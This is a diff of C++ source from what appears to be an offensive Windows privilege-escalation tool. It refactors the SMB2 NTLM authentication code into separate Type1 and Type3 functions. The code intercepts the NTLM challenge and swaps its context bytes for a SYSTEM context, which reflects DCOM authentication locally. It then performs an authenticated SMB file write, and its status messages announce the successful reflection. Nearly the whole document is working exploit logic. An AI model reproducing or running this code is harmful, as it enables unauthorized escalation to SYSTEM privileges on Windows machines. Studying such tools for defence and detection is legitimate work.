@@ -26,7 +26,9 @@ BOOL GenClientContext(BYTE* pIn, DWORD cbIn, BYTE* pOut, DWORD* pcbOut, BOOL* pf
 int findNTLMBytes(char* bytes, int len);
 BOOL SMBNegoProtocol(SOCKET s, char* recBuffer);
 BOOL SMB2NegoProtocol(SOCKET s, char* recBuffer);
-
+BOOL SMB2DoAuthentication(SOCKET s, char* recBuffer, int& MessageID);
+BOOL SMB2AuthNtlmType1(SOCKET s, char* recBuffer, int& MessageID, int* outLen, CredHandle* hCred, struct _SecHandle* hcText);
+BOOL SMB2AuthNtlmType3(SOCKET s, char* recBuffer, int& MessageID, int outLen, CredHandle* hCred, struct _SecHandle* hcText);
 
 void SMBAuthenticatedFileWrite()
 {
@@ -38,174 +40,29 @@ void SMBAuthenticatedFileWrite()
 
 BOOL DoAuthenticatedFileWriteSMB(SOCKET s, wchar_t* path, wchar_t* fname, wchar_t *infile)
 {
-    BOOL fDone = FALSE;
     DWORD cbOut = 0;
     DWORD cbIn = 0;
-    PBYTE pOutBuf;
     myshort slen;
-    CredHandle hCred;
-    struct _SecHandle  hcText;
+    int MessageID = 2;
     char recBuffer[DEFAULT_BUFLEN];
-
 
     SMBNegoProtocol(s, recBuffer);
     SMB2NegoProtocol(s, recBuffer);
+    SMB2DoAuthentication(s, recBuffer, MessageID);
 
-    
-    usmb2_header s2h;
-    usmb2_data s2d;
 
-    pOutBuf = (PBYTE)malloc(DEFAULT_BUFLEN);
-
-    cbOut = DEFAULT_BUFLEN;
-
-    if (!GenClientContext(NULL, 0, pOutBuf, &cbOut, &fDone, (SEC_WCHAR*)TargetNameSpn, &hCred, &hcText))
-    {
-        return(FALSE);
-    }
-
-    char InBuffer[1024], OutBuffer[1024];
-    int len = 0;
+    char InBuffer[1024];
     int plen = 0;
-    unsigned char sessid[8];
-    int MessageID=2;
 
-    
 
     myint mpid;
     mpid.i = GetCurrentProcessId();
-
-    memcpy(&s2h.smb2_header.ProtocolID, "\xfe\x53\x4d\x42", 4);
-    memcpy(&s2h.smb2_header.CreditCharge, "\01\00", 2);
-    memcpy(&s2h.smb2_header.StructureSize, "\x40\x00", 2);
-    memcpy(&s2h.smb2_header.ChannelSequence[0], "\x00\x00", 2);
-    memcpy(&s2h.smb2_header.Reserved[0], "\x00\x00", 2);
-    memcpy(&s2h.smb2_header.Command[0], "\x01\x00", 2);
-    memcpy(&s2h.smb2_header.CreditRequest[0], "\x1f\x00", 2);
-    memcpy(&s2h.smb2_header.Flags[0], "\x00\x00\x00\x00", 4);
-    memcpy(&s2h.smb2_header.NextCommand[0], "\x00\x00\x00\x00", 4);
-    s2h.smb2_header.MessageID = MessageID++;// , "\x02\x00\x00\x00\x00\x00\x00\x00", 8);
-    memcpy(&s2h.smb2_header.ProcessID[0], mpid.buffer, 4);
-    memcpy(&s2h.smb2_header.TreeID[0], "\x00\x00\x00\x00", 4);
-    memcpy(&s2h.smb2_header.SessionID[0], "\x00\x00\x00\x00\x00\x00\x00\x00", 8);
-    memcpy(&s2h.smb2_header.Signature[0], "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 16);
-
-    myshort datalen;
-    datalen.i = cbOut;
-    memcpy(&s2d.smb2_data.StructureSize, "\x19\x00", 2);
-    memcpy(&s2d.smb2_data.Flags, "\x00", 1);
-    memcpy(&s2d.smb2_data.SecurityMode, "\x01", 1);
-    memcpy(&s2d.smb2_data.Capabilities, "\x07\x00\x00\x00", 4);
-    memcpy(&s2d.smb2_data.Channel, "\x00\x00\x00\x00", 4);
-    memcpy(&s2d.smb2_data.SecurityBufferOffset, "\x58\x00", 2);
-    memcpy(&s2d.smb2_data.SecurityBufferLength, datalen.buffer, 2);
-    memcpy(&s2d.smb2_data.PreviousSessionID, "\x00\x00\x00\x00\x00\x00\x00\x00", 8);
-
-    plen = sizeof(s2h.buffer) + sizeof(s2d.buffer) + cbOut;
-    datalen.i = plen;
-    int start = 2;
-    slen.i = plen;
-    char c = plen;
-
-    memset(OutBuffer, 0, sizeof(OutBuffer));
-
-    start = 0;
-    memcpy(&OutBuffer[start], s2h.buffer, sizeof(s2h.buffer));
-    memcpy(&OutBuffer[start], s2h.buffer, sizeof(s2h.buffer));
-    start += sizeof(s2h.buffer);
-    memcpy(&OutBuffer[start], s2d.buffer, sizeof(s2d.buffer));
-
-    start += sizeof(s2d.buffer);
-    memcpy(&OutBuffer[start], pOutBuf, cbOut);
-    start = sizeof(s2h) + sizeof(s2d) + cbOut;
-    char netsess[4];
-    memset(netsess, 0, 4);
-    netsess[3] = slen.buffer[0];
-    netsess[2] = slen.buffer[1];
-    len = send(s, (char*)netsess, 4, 0);
-    len = send(s, (char*)OutBuffer, start, 0);
-
-    len = recv(s, recBuffer, DEFAULT_BUFLEN, 0);
-
-    int pos = findNTLMBytes(recBuffer, len);
-    memcpy(&InBuffer[0], &recBuffer[pos], len - pos);
-    if (InBuffer[8] == 2)
-    {
-        memcpy(UserContext, &InBuffer[32], 8);
-        WaitForSingleObject(event1, INFINITE);
-        // for local auth reflection we don't really need to relay the entire packet 
-        // swapping the context in the Reserved bytes with the SYSTEM context is enough
-        memcpy(&InBuffer[32], SystemContext, 8);
-        memcpy(&recBuffer[pos], &InBuffer[0], len - pos);
-        printf("[+] SMB Client Auth Context swapped with SYSTEM \n");
-    }
-    else {
-        printf("[!] Authentication over SMB is not using NTLM. Exiting...\n");
-        return FALSE;
-    }
-    cbOut = DEFAULT_BUFLEN;
+    usmb2_header s2h;
+    u_tree_connect_request_header trh;
+    unsigned char sessid[8];
     
     memcpy(&sessid[0], &recBuffer[44], 8);
-    memcpy(&s2h.smb2_header.ProtocolID, "\xfe\x53\x4d\x42", 4);
-    memcpy(&s2h.smb2_header.CreditCharge, "\01\00", 2);
-    memcpy(&s2h.smb2_header.StructureSize, "\x40\x00", 2);
-    memcpy(&s2h.smb2_header.ChannelSequence[0], "\x00\x00", 2);
-    memcpy(&s2h.smb2_header.Reserved[0], "\x00\x00", 2);
-    memcpy(&s2h.smb2_header.Command[0], "\x01\x00", 2);
-    memcpy(&s2h.smb2_header.CreditRequest[0], "\x1f\x00", 2);
-    memcpy(&s2h.smb2_header.Flags[0], "\x10\x00\x00\x00", 4);
-    memcpy(&s2h.smb2_header.NextCommand[0], "\x00\x00\x00\x00", 4);
-    s2h.smb2_header.MessageID = MessageID++;// , "\x03\x00\x00\x00\x00\x00\x00\x00", 8);
-    memcpy(&s2h.smb2_header.ProcessID[0], mpid.buffer, 4);
-    memcpy(&s2h.smb2_header.TreeID[0], "\x00\x00\x00\x00", 4);
-    memcpy(&s2h.smb2_header.SessionID[0], sessid, 8);
-    memcpy(&s2h.smb2_header.Signature[0], "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 16);
-    if (!GenClientContext((BYTE*)InBuffer, len - pos, pOutBuf, &cbOut, &fDone, (SEC_WCHAR*)TargetNameSpn, &hCred, &hcText))
-        exit(-1);
 
-    datalen.i = cbOut;
-
-    SetEvent(event2);
-    WaitForSingleObject(event3, INFINITE);
-
-    memcpy(&s2d.smb2_data.StructureSize, "\x19\00", 2);
-    memcpy(&s2d.smb2_data.Flags, "\00", 1);
-    memcpy(&s2d.smb2_data.SecurityMode, "\x01", 1);
-    memcpy(&s2d.smb2_data.Capabilities, "\x07\x00\x00\x00", 4);
-    memcpy(&s2d.smb2_data.Channel, "\x00\x00\x00\x00", 4);
-    memcpy(&s2d.smb2_data.SecurityBufferOffset, "\x58\x00", 2);
-    memcpy(&s2d.smb2_data.SecurityBufferLength, datalen.buffer, 2);
-    memcpy(&s2d.smb2_data.PreviousSessionID, "\x00\x00\x00\x00\x00\x00\x00\x00", 8);
-    plen = sizeof(s2h.buffer) + sizeof(s2d.buffer) + cbOut;
-    slen.i = plen;
-    c = plen;
-    memcpy(&OutBuffer[0], slen.buffer, 4);
-    start = 0;
-    memcpy(&OutBuffer[start], s2h.buffer, sizeof(s2h.buffer));
-    start += sizeof(s2h.buffer);
-    memcpy(&OutBuffer[start], s2d.buffer, sizeof(s2d.buffer));
-    start += sizeof(s2d.buffer);
-    memcpy(&OutBuffer[start], pOutBuf, cbOut);
-    start += cbOut;
-
-    memset(netsess, 0, 4);
-    netsess[3] = slen.buffer[0];
-    netsess[2] = slen.buffer[1];
-    len = send(s, (char*)netsess, 4, 0);
-    len = send(s, (char*)OutBuffer, start, 0);
-
-    // here we receive the return status of the SMB authentication
-    len = recv(s, recBuffer, DEFAULT_BUFLEN, 0);
-    unsigned int* ntlmAuthStatus = (unsigned int*)(recBuffer + 12);
-    if (*ntlmAuthStatus != 0) {
-        printf("[!] SMB reflected DCOM authentication failed with status code 0x%x\n", *ntlmAuthStatus);
-        return FALSE;
-    }
-    else {
-        printf("[+] SMB reflected DCOM authentication succeeded!\n");
-    }
-
-    u_tree_connect_request_header trh;
     trh.trh.flags = 0;
     trh.trh.structured_size = 9;
     trh.trh.path_offset = 0x48;
@@ -224,9 +81,11 @@ BOOL DoAuthenticatedFileWriteSMB(SOCKET s, wchar_t* path, wchar_t* fname, wchar_
     memcpy(&s2h.smb2_header.TreeID[0], "\x00\x00\x00\x00", 4);
     memcpy(&s2h.smb2_header.SessionID[0], sessid, 8);
     memcpy(&s2h.smb2_header.Signature[0], "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 16);
+    char netsess[4];
     memset(netsess, 0, 4);
     netsess[3] = sizeof(s2h.buffer) + sizeof(trh) + wcslen(path) * 2;//length cablata si calcola facilmeente vedi sopra
-
+    
+    int len = 0;
     len = send(s, netsess, 4, 0);
     len = send(s, (char*)s2h.buffer, sizeof(s2h.buffer), 0);
     len = send(s, trh.buffer, sizeof(trh.buffer), 0);
@@ -318,11 +177,10 @@ BOOL DoAuthenticatedFileWriteSMB(SOCKET s, wchar_t* path, wchar_t* fname, wchar_
     
     len = send(s, (char*)fname, wcslen(fname) * 2, 0);
     len = send(s, (char*)extra_info, sizeof(extra_info), 0);
-     // here we receive the return status of the Connect Tree from SMB
+    // here we receive the return status of the Connect Tree from SMB
     len = recv(s, recBuffer, DEFAULT_BUFLEN, 0);
     
     // here we receive the return status of the Create Request File from SMB
-    
     unsigned int* createFileStatus = (unsigned int*)(recBuffer + 12);
     if (*createFileStatus != 0) {
         printf("[!] SMB Create Request File failed with status code 0x%x\n", *createFileStatus);
@@ -442,7 +300,6 @@ BOOL DoAuthenticatedFileWriteSMB(SOCKET s, wchar_t* path, wchar_t* fname, wchar_
     memcpy(close_file + 8, fileid, 16);
     len = send(s, (char*)InBuffer, sizeof(s2h.buffer) + 3, 0);
     len = send(s, (char*)close_file, sizeof(close_file), 0);
-    disconnect_tree:
     unsigned char tree_disconnect[] = \
         "\x04\x00\x00";
     memset(netsess, 0, 4);
@@ -466,7 +323,6 @@ BOOL DoAuthenticatedFileWriteSMB(SOCKET s, wchar_t* path, wchar_t* fname, wchar_
     len = send(s, (char*)InBuffer, sizeof(s2h.buffer) + 3, 0);
     len = send(s, (char*)tree_disconnect, sizeof(tree_disconnect), 0);
 
-    free(pOutBuf);
     return(TRUE);
 }
 
@@ -627,5 +483,189 @@ BOOL SMB2NegoProtocol(SOCKET s, char* recBuffer) {
     c = smb2_nego_protocol[3];
     len = send(s, (char*)smb2_nego_protocol, c + 4, 0);
     len = recv(s, recBuffer, DEFAULT_BUFLEN, 0);
+    return ret;
+}
+
+BOOL SMB2DoAuthentication(SOCKET s, char* recBuffer, int& MessageID) {
+    BOOL ret = TRUE;
+    int outLen = 0;
+    CredHandle hCred;
+    struct _SecHandle  hcText;
+
+    SMB2AuthNtlmType1(s, recBuffer, MessageID, &outLen, &hCred, &hcText);
+    SMB2AuthNtlmType3(s, recBuffer, MessageID, outLen, &hCred, &hcText);
+
+    // here we receive the return status of the SMB authentication
+    unsigned int* ntlmAuthStatus = (unsigned int*)(recBuffer + 12);
+    if (*ntlmAuthStatus != 0) {
+        printf("[!] SMB reflected DCOM authentication failed with status code 0x%x\n", *ntlmAuthStatus);
+        ret = FALSE;
+    }
+    else {
+        printf("[+] SMB reflected DCOM authentication succeeded!\n");
+    }
+
+    return ret;
+}
+
+BOOL SMB2AuthNtlmType1(SOCKET s, char* recBuffer, int& MessageID, int *outLen, CredHandle* hCred, struct _SecHandle* hcText) {
+    BOOL ret = TRUE;
+    usmb2_header s2h;
+    usmb2_data s2d;
+    myint mpid;
+    BYTE pOutBuf[DEFAULT_BUFLEN];
+    DWORD cbOut = DEFAULT_BUFLEN;
+    BOOL fDone = FALSE;
+    int plen = 0;
+    myshort slen;
+    myshort datalen;
+    char netsess[4];
+    int start = 2;
+    char OutBuffer[1024];
+    char finalPacket[DEFAULT_BUFLEN];
+
+    if (!GenClientContext(NULL, 0, pOutBuf, &cbOut, &fDone, (SEC_WCHAR*)TargetNameSpn, hCred, hcText))
+    {
+        return(FALSE);
+    }
+
+    memcpy(&s2h.smb2_header.ProtocolID, "\xfe\x53\x4d\x42", 4);
+    memcpy(&s2h.smb2_header.CreditCharge, "\01\00", 2);
+    memcpy(&s2h.smb2_header.StructureSize, "\x40\x00", 2);
+    memcpy(&s2h.smb2_header.ChannelSequence[0], "\x00\x00", 2);
+    memcpy(&s2h.smb2_header.Reserved[0], "\x00\x00", 2);
+    memcpy(&s2h.smb2_header.Command[0], "\x01\x00", 2);
+    memcpy(&s2h.smb2_header.CreditRequest[0], "\x1f\x00", 2);
+    memcpy(&s2h.smb2_header.Flags[0], "\x00\x00\x00\x00", 4);
+    memcpy(&s2h.smb2_header.NextCommand[0], "\x00\x00\x00\x00", 4);
+    s2h.smb2_header.MessageID = MessageID++;
+    mpid.i = GetCurrentProcessId();
+    memcpy(&s2h.smb2_header.ProcessID[0], mpid.buffer, 4);
+    memcpy(&s2h.smb2_header.TreeID[0], "\x00\x00\x00\x00", 4);
+    memcpy(&s2h.smb2_header.SessionID[0], "\x00\x00\x00\x00\x00\x00\x00\x00", 8);
+    memcpy(&s2h.smb2_header.Signature[0], "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 16);
+
+    datalen.i = cbOut;
+    memcpy(&s2d.smb2_data.StructureSize, "\x19\x00", 2);
+    memcpy(&s2d.smb2_data.Flags, "\x00", 1);
+    memcpy(&s2d.smb2_data.SecurityMode, "\x01", 1);
+    memcpy(&s2d.smb2_data.Capabilities, "\x07\x00\x00\x00", 4);
+    memcpy(&s2d.smb2_data.Channel, "\x00\x00\x00\x00", 4);
+    memcpy(&s2d.smb2_data.SecurityBufferOffset, "\x58\x00", 2);
+    memcpy(&s2d.smb2_data.SecurityBufferLength, datalen.buffer, 2);
+    memcpy(&s2d.smb2_data.PreviousSessionID, "\x00\x00\x00\x00\x00\x00\x00\x00", 8);
+
+    plen = sizeof(s2h.buffer) + sizeof(s2d.buffer) + cbOut;
+    datalen.i = plen;
+    slen.i = plen;
+
+    memset(OutBuffer, 0, sizeof(OutBuffer));
+
+    start = 0;
+    memcpy(&OutBuffer[start], s2h.buffer, sizeof(s2h.buffer));
+    memcpy(&OutBuffer[start], s2h.buffer, sizeof(s2h.buffer));
+    start += sizeof(s2h.buffer);
+    memcpy(&OutBuffer[start], s2d.buffer, sizeof(s2d.buffer));
+    start += sizeof(s2d.buffer);
+    memcpy(&OutBuffer[start], pOutBuf, cbOut);
+    start = sizeof(s2h) + sizeof(s2d) + cbOut;
+    memset(netsess, 0, 4);
+    netsess[3] = slen.buffer[0];
+    netsess[2] = slen.buffer[1];
+
+    memcpy(finalPacket, netsess, 4);
+    memcpy(finalPacket+4, OutBuffer, start);
+    send(s, finalPacket, 4+start, 0);
+    *outLen = recv(s, recBuffer, DEFAULT_BUFLEN, 0);
+    return ret;
+}
+
+BOOL SMB2AuthNtlmType3(SOCKET s, char* recBuffer, int& MessageID, int outLen, CredHandle* hCred, struct _SecHandle* hcText) {
+    BOOL ret = TRUE;
+    usmb2_header s2h;
+    usmb2_data s2d;
+    myint mpid;
+    BYTE pOutBuf[DEFAULT_BUFLEN];
+    DWORD cbOut = DEFAULT_BUFLEN;
+    BOOL fDone = FALSE;
+    int plen = 0;
+    myshort slen;
+    myshort datalen;
+    char netsess[4];
+    int start = 2;
+    char ntlmtType2[1024];
+    char OutBuffer[1024];
+    unsigned char sessid[8];
+    int pos = 0;
+    char finalPacket[DEFAULT_BUFLEN];
+
+    pos = findNTLMBytes(recBuffer, outLen);
+    memcpy(&ntlmtType2[0], &recBuffer[pos], outLen - pos);
+    if (ntlmtType2[8] == 2)
+    {
+        memcpy(UserContext, &ntlmtType2[32], 8);
+        WaitForSingleObject(event1, INFINITE);
+        // for local auth reflection we don't really need to relay the entire packet 
+        // swapping the context in the Reserved bytes with the SYSTEM context is enough
+        memcpy(&ntlmtType2[32], SystemContext, 8);
+        memcpy(&recBuffer[pos], &ntlmtType2[0], outLen - pos);
+        printf("[+] SMB Client Auth Context swapped with SYSTEM \n");
+    }
+    else {
+        printf("[!] Authentication over SMB is not using NTLM. Exiting...\n");
+        return FALSE;
+    }
+
+    memcpy(&sessid[0], &recBuffer[44], 8);
+    memcpy(&s2h.smb2_header.ProtocolID, "\xfe\x53\x4d\x42", 4);
+    memcpy(&s2h.smb2_header.CreditCharge, "\01\00", 2);
+    memcpy(&s2h.smb2_header.StructureSize, "\x40\x00", 2);
+    memcpy(&s2h.smb2_header.ChannelSequence[0], "\x00\x00", 2);
+    memcpy(&s2h.smb2_header.Reserved[0], "\x00\x00", 2);
+    memcpy(&s2h.smb2_header.Command[0], "\x01\x00", 2);
+    memcpy(&s2h.smb2_header.CreditRequest[0], "\x1f\x00", 2);
+    memcpy(&s2h.smb2_header.Flags[0], "\x10\x00\x00\x00", 4);
+    memcpy(&s2h.smb2_header.NextCommand[0], "\x00\x00\x00\x00", 4);
+    s2h.smb2_header.MessageID = MessageID++;// , "\x03\x00\x00\x00\x00\x00\x00\x00", 8);
+    mpid.i = GetCurrentProcessId();
+    memcpy(&s2h.smb2_header.ProcessID[0], mpid.buffer, 4);
+    memcpy(&s2h.smb2_header.TreeID[0], "\x00\x00\x00\x00", 4);
+    memcpy(&s2h.smb2_header.SessionID[0], sessid, 8);
+    memcpy(&s2h.smb2_header.Signature[0], "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 16);
+    memcpy(&s2d.smb2_data.StructureSize, "\x19\00", 2);
+    memcpy(&s2d.smb2_data.Flags, "\00", 1);
+    memcpy(&s2d.smb2_data.SecurityMode, "\x01", 1);
+    memcpy(&s2d.smb2_data.Capabilities, "\x07\x00\x00\x00", 4);
+    memcpy(&s2d.smb2_data.Channel, "\x00\x00\x00\x00", 4);
+    memcpy(&s2d.smb2_data.SecurityBufferOffset, "\x58\x00", 2);
+    memcpy(&s2d.smb2_data.PreviousSessionID, "\x00\x00\x00\x00\x00\x00\x00\x00", 8);
+
+    if (!GenClientContext((BYTE*)ntlmtType2, outLen - pos, pOutBuf, &cbOut, &fDone, (SEC_WCHAR*)TargetNameSpn, hCred, hcText))
+        exit(-1);
+    SetEvent(event2);
+    WaitForSingleObject(event3, INFINITE);
+
+    datalen.i = cbOut;
+    memcpy(&s2d.smb2_data.SecurityBufferLength, datalen.buffer, 2);
+    plen = sizeof(s2h.buffer) + sizeof(s2d.buffer) + cbOut;
+    slen.i = plen;
+    memcpy(&OutBuffer[0], slen.buffer, 4);
+    start = 0;
+    memcpy(&OutBuffer[start], s2h.buffer, sizeof(s2h.buffer));
+    start += sizeof(s2h.buffer);
+    memcpy(&OutBuffer[start], s2d.buffer, sizeof(s2d.buffer));
+    start += sizeof(s2d.buffer);
+    memcpy(&OutBuffer[start], pOutBuf, cbOut);
+    start += cbOut;
+
+    memset(netsess, 0, 4);
+    netsess[3] = slen.buffer[0];
+    netsess[2] = slen.buffer[1];
+
+    memcpy(finalPacket, netsess, 4);
+    memcpy(finalPacket + 4, OutBuffer, start);
+    send(s, finalPacket, 4 + start, 0);
+    recv(s, recBuffer, DEFAULT_BUFLEN, 0);
+
     return ret;
 }
